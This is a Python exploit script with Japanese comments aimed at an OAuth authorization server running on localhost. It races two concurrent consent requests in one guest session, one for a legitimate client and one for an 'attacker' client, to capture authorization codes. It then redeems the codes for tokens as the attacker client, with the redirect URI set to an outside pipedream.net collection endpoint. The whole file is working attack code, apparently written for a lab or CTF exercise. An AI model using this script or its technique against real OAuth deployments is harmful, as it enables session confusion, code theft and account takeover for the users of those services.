import concurrent.futures
import requests
import re
from requests.sessions import Session

# セッションの作成
guest_session = Session()

# /authorizeへのGETリクエストのパラメータ
client_authorize_params = {
    'client_id': 'client',
    'redirect_uri': 'http://localhost:3000/callback',
    'response_type': 'code',
    'state': 'some_state',
    'scope': 'some_scope'
}

attacker_authorize_params = {
    'client_id': 'attacker',
    'redirect_uri': 'https://eo3ffg9ftq57dog.m.pipedream.net/callback',
    'response_type': 'code',
    'state': 'some_state',
    'scope': 'some_scope'
}

# /loginへのPOSTリクエストのデータ
guest_login_data = {'userId': 'guest', 'password': 'guest'}

# /consentへのPOSTリクエストのデータ
consent_data = {'consent': 'Yes'}

# リクエストURL
base_url = 'http://localhost:3001'
authorize_url = f'{base_url}/authorize'
login_url = f'{base_url}/login'
consent_url = f'{base_url}/consent'
token_url = f'{base_url}/token'


def authorize_and_login(session, authorize_params, login_data):
    # /authorizeへのGETリクエスト
    session.get(authorize_url, params=authorize_params)
    
    # /loginへのPOSTリクエスト
    session.post(login_url, data=login_data)


# guestで、/authorizeへのGETリクエストと/loginへのPOSTリクエストを送信
authorize_and_login(guest_session, client_authorize_params, guest_login_data)
authorize_and_login(guest_session, attacker_authorize_params, guest_login_data)


def post_consent_and_get_code(session, client_id):
    response = session.post(consent_url, data=consent_data)
    print(f"Client ID: {client_id}, Status: {response.status_code}, Response URL: {response.url}")
    redirect_url = response.url
    match = re.search(r'code=([^&]*)', redirect_url)
    if match:
        print(f"Client ID: {client_id}, Code: {match.group(1)}")
        return match.group(1)

with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
    futures = [
        executor.submit(post_consent_and_get_code, guest_session, 'client'),
        executor.submit(post_consent_and_get_code, guest_session, 'attacker')
    ]
    
    codes = []
    for future in concurrent.futures.as_completed(futures):
        code = future.result()
        if code:
            codes.append(code)

post_token_client_id = 'attacker'

for code in codes:
    token_data = {
        'client_id': post_token_client_id,
        'client_secret': 'secret', 
        'code': code,
        'grant_type': 'authorization_code',
        'redirect_uri': 'https://eo3ffg9ftq57dog.m.pipedream.net/callback'
    }
    response = guest_session.post(token_url, data=token_data)
    print(f"Client ID: {post_token_client_id}, Status: {response.status_code}, Response JSON: {response.text}")
